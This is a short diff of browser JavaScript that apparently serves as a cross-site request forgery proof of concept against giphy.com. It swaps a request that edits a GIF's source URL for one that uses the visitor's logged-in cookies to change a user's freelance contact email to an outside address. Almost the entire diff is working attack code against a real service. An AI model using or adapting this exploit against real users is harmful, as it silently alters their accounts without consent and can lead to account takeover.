@@ -9,16 +9,7 @@ var xhr = new XMLHttpRequest();
         }
     };
    xhr.withCredentials = true;
-    xhr.open("post", "https://giphy.com/ajax/gif/update", true);
+    xhr.open("post", "https://giphy.com/api/v1/users/29382035/freelance-email/", true);
     xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-   
-xhr.setRequestHeader("Accept", "application/Json");
-console.log("HREF: " + window.location.href);
-console.log("Hostname: " + window.location.hostname);
-console.log("Path: " +  window.location.pathname);
-console.log("Search: " + window.location.search);
 
-window.history.replaceState(null, '', 'gifs/aJKqx5Wy1yZpIyF4BW');
-    
-
-    xhr.send("gif_id=pXuuwZj9u3Ar1GgivY&key=source_post_url&value=http%3A%2F%2Ftestus.COM");
+    xhr.send("email=userchange@live.fr&project_type=Editorial&project_start_date=1970-01-01&project_end_date=2021-08-24&project_budget_min=5001project_budget_max=2000&project_gif_count=1&project_sticker_count=0&project_video_count=0&project_flexible=false");
